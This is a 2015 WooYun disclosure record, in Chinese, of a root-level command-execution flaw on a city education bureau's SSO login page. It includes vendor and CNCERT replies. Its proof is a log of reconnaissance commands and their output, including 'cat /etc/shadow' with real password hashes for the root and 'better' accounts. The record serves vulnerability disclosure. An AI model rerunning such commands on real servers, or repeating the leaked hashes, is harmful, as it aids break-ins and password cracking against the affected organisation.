{"id": 81486, "wybug_id": "wooyun-2015-0153547", "wybug_title": "某市教育局官网命令执行漏洞getshell", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "朱元璋", "wybug_date": "2015-11-11 15:56", "wybug_open_date": "2016-01-11 15:32", "wybug_type": "系统/服务补丁不及时", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-11：\t细节向公众公开  简要描述： RT 详细说明：  打开官网地址http://**.**.**.**/点击图中标识链接\n\n\n\n链接地址**.**.**.**:8080/SSOServer/login_checkUser.action存在命令执行漏洞\n\n\n\n   漏洞证明：  \n　> whoami====================================================================================================================================root> id====================================================================================================================================uid=0(root) gid=0(root) ?=0(root) ??=unconfined_u:unconfined_r:unconfined_java_t:s0-s0:c0.c1023> ifconfig====================================================================================================================================eth0      Link encap:Ethernet  HWaddr 00:50:56:A8:54:9E            inet addr:**.**.**.**  Bcast:**.**.**.**  Mask:**.**.**.**          inet6 addr: fe80::250:56ff:fea8:549e/64 Scope:Link          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:52148005 errors:0 dropped:0 overruns:0 frame:0          TX packets:21399861 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000           RX bytes:1553852628 (1.4 GiB)  TX bytes:1089562689 (1.0 GiB)lo        Link encap:Local Loopback            inet addr:**.**.**.**  Mask:**.**.**.**          inet6 addr: ::1/128 Scope:Host          UP LOOPBACK RUNNING  MTU:16436  Metric:1          RX packets:38900058 errors:0 dropped:0 overruns:0 frame:0          TX packets:38900058 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:0           RX bytes:1603862680 (1.4 GiB)  TX bytes:1603862680 (1.4 GiB)> ls====================================================================================================================================binconfG:libLICENSElogsNOTICERELEASE-NOTESRUNNING.txttempwebappswork> uname -a====================================================================================================================================Linux localhost.localdomain 2.6.32-358.el6.i686 #1 SMP Tue Jan 29 11:48:01 EST 2013 i686 i686 i386 GNU/Linux> uname -r====================================================================================================================================2.6.32-358.el6.i686> lsb_release -a====================================================================================================================================LSB Version:\t:base-4.0-ia32:base-4.0-noarch:core-4.0-ia32:core-4.0-noarch:graphics-4.0-ia32:graphics-4.0-noarch:printing-4.0-ia32:printing-4.0-noarch> cat  /etc/issue====================================================================================================================================Red Hat Enterprise Linux Server release 6.4 (Santiago)Kernel \\r on an \\m> cat /etc/lsb-release====================================================================================================================================LSB_VERSION=base-4.0-ia32:base-4.0-noarch:core-4.0-ia32:core-4.0-noarch:graphics-4.0-ia32:graphics-4.0-noarch:printing-4.0-ia32:printing-4.0-noarch> cat /proc/version ====================================================================================================================================Linux version 2.6.32-358.el6.i686 (mockbuild@**.**.**.**) (gcc version 4.4.7 20120313 (Red Hat 4.4.7-3) (GCC) ) #1 SMP Tue Jan 29 11:48:01 EST 2013> cat /etc/shadow====================================================================================================================================root:$6$PFVm7let4x2FBZIi$JQfq8zpNhC4.bOIM26K1beqpWB0/eKYVCL1dEFvOvNdIRMbvKHwdgCeB1h4lIg9X8TMh5G1hipE/TieuwaMGH/:16528:0:99999:7:::bin:*:15615:0:99999:7:::daemon:*:15615:0:99999:7:::adm:*:15615:0:99999:7:::lp:*:15615:0:99999:7:::sync:*:15615:0:99999:7:::shutdown:*:15615:0:99999:7:::halt:*:15615:0:99999:7:::mail:*:15615:0:99999:7:::uucp:*:15615:0:99999:7:::operator:*:15615:0:99999:7:::games:*:15615:0:99999:7:::gopher:*:15615:0:99999:7:::ftp:*:15615:0:99999:7:::nobody:*:15615:0:99999:7:::dbus:!!:16528::::::usbmuxd:!!:16528::::::vcsa:!!:16528::::::rpc:!!:16528:0:99999:7:::rtkit:!!:16528::::::avahi-autoipd:!!:16528::::::pulse:!!:16528::::::haldaemon:!!:16528::::::ntp:!!:16528::::::apache:!!:16528::::::saslauth:!!:16528::::::postfix:!!:16528::::::abrt:!!:16528::::::rpcuser:!!:16528::::::nfsnobody:!!:16528::::::gdm:!!:16528::::::sshd:!!:16528::::::tcpdump:!!:16528::::::better:$6$RPFOVRr7RDaFiHwB$6AbnNELKlHqsX3eghMZCBfDcdLpsi2EaWAimUpsxjLm585efSefnzNGsqexnWLG3ar46iGkyBW1cHfU4/X.Dp1:16528:0:99999:7:::mysql:!!:16528::::::> chkconfig --list====================================================================================================================================NetworkManager \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??abrt-ccpp      \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??abrtd          \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??acpid          \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??atd            \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??auditd         \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??autofs         \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??blk-availability\t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??bluetooth      \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??certmonger     \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??cpuspeed       \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??crond          \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??cups           \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??dnsmasq        \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??firstboot      \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??haldaemon      \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??htcacheclean   \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??httpd          \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??ip6tables      \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??iptables       \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??irqbalance     \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??kdump          \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??lvm2-monitor   \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??mdmonitor      \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??messagebus     \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??mysqld         \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??netconsole     \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??netfs          \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??network        \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??nfs            \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??nfslock        \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??ntpd           \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??ntpdate        \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??oddjobd        \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??portreserve    \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??postfix        \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??psacct         \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??quota_nld      \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??rdisc          \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??restorecond    \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??rhnsd          \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??rhsmcertd      \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??rngd           \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??rpcbind        \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??rpcgssd        \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??rpcidmapd      \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??rpcsvcgssd     \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??rsyslog        \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??saslauthd      \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??smartd         \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??snmpd          \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??snmptrapd      \t0:??\t1:??\t2:??\t3:??\t4:??\t5:?> chkconfig --list atd====================================================================================================================================atd            \t0:??\t1:??\t2:??\t3:??\t4:??\t5:??\t6:??> cat /etc/resolv.conf====================================================================================================================================# Generated by NetworkManagernameserver **.**.**.**> lsb_release -a====================================================================================================================================LSB Version:\t:base-4.0-ia32:base-4.0-noarch:core-4.0-ia32:core-4.0-noarch:graphics-4.0-ia32:graphics-4.0-noarch:printing-4.0-ia32:printing-4.0-noarch> netstat -na====================================================================================================================================Active Internet connections (servers and established)Proto Recv-Q Send-Q Local Address               Foreign Address             State      tcp        0      0 **.**.**.**:53001               **.**.**.**:*                   LISTEN      tcp        0      0 **.**.**.**:3306                **.**.**.**:*                   LISTEN      tcp        0      0 **.**.**.**:111                 **.**.**.**:*                   LISTEN      tcp        0      0 **.**.**.**:22                  **.**.**.**:*                   LISTEN      tcp        0      0 **.**.**.**:631               **.**.**.**:*                   LISTEN      tcp        0      0 **.**.**.**:25                **.**.**.**:*                   LISTEN      tcp        0      0 **.**.**.**:3306              **.**.**.**:48283             ESTABLISHED tcp        0      0 **.**.**.**:22              **.**.**.**:3772        ESTABLISHED tcp        0      0 **.**.**.**:3306              **.**.**.**:48282             ESTABLISHED tcp        0      0 **.**.**.**:3306              **.**.**.**:48279             ESTABLISHED tcp        0      0 **.**.**.**:3306              **.**.**.**:48280             ESTABLISHED tcp        0      0 **.**.**.**:3306              **.**.**.**:48281             ESTABLISHED tcp        0      0 **.**.**.**:3306              **.**.**.**:48278             ESTABLISHED tcp        0      0 **.**.**.**:3306              **.**.**.**:48277             ESTABLISHED tcp        0      0 :::8009                     :::*                        LISTEN      tcp        0      0 :::111                      :::*                        LISTEN      tcp        0      0 :::8080                     :::*                        LISTEN      tcp        0      0 :::22                       :::*                        LISTEN      tcp        0      0 ::1:631                     :::*                        LISTEN      tcp        0      0 ::1:25                      :::*                        LISTEN      tcp        0      0 ::ffff:**.**.**.**:8005       :::*                        LISTEN      tcp        0      0 :::33829                    :::*                        LISTEN      tcp        0      0 ::ffff:**.**.**.**:48283      ::ffff:**.**.**.**:3306       ESTABLISHED tcp        0      0 ::ffff:**.**.**.**:8080     ::ffff:**.**.**.**:7996  ESTABLISHED tcp        0      0 ::ffff:**.**.**.**:8080     ::ffff:**.**.**.**:7994  TIME_WAIT   tcp        0      0 ::ffff:**.**.**.**:48281      ::ffff:**.**.**.**:3306       ESTABLISHED tcp        0      0 ::ffff:**.**.**.**:48277      ::ffff:**.**.**.**:3306       ESTABLISHED tcp        1      0 ::ffff:**.**.**.**:8080     ::ffff:**.**.**.**:7970  CLOSE_WAIT  tcp        0      0 ::ffff:**.**.**.**:48280      ::ffff:**.**.**.**:3306       ESTABLISHED tcp        0      0 ::ffff:**.**.**.**:48278      ::ffff:**.**.**.**:3306       ESTABLISHED tcp        0      0 ::ffff:**.**.**.**:48282      ::ffff:**.**.**.**:3306       ESTABLISHED tcp        0      0 ::ffff:**.**.**.**:48279      ::ffff:**.**.**.**:3306       ESTABLISHED tcp        0      0 ::ffff:**.**.**.**:8080     ::ffff:**.**.**.**:7987  TIME_WAIT   tcp        0      0 ::ffff:**.**.**.**:8080     ::ffff:**.**.**.**:7991  TIME_WAIT   udp        0      0 **.**.**.**:933                 **.**.**.**:*                               udp        0      0 **.**.**.**:54873               **.**.**.**:*                               udp        0      0 **.**.**.**:111                 **.**.**.**:*                               udp        0      0 **.**.**.**:631                 **.**.**.**:*                               udp        0      0 **.**.**.**:123             **.**.**.**:*                               udp        0      0 **.**.**.**:123               **.**.**.**:*                               udp        0      0 **.**.**.**:123                 **.**.**.**:*                               udp        0      0 **.**.**.**:636                 **.**.**.**:*                               udp        0      0 :::38167                    :::*                                    udp        0      0 :::933                      :::*                                    udp        0      0 :::111            　\n   修复方案：  加强安全意识   版权声明：转载请注明来源 朱元璋@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-11-23 09:39 厂商回复： CNVD确认并复现所述漏洞情况，已经转由CNCERT下发给河南分中心，由河南分中心后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}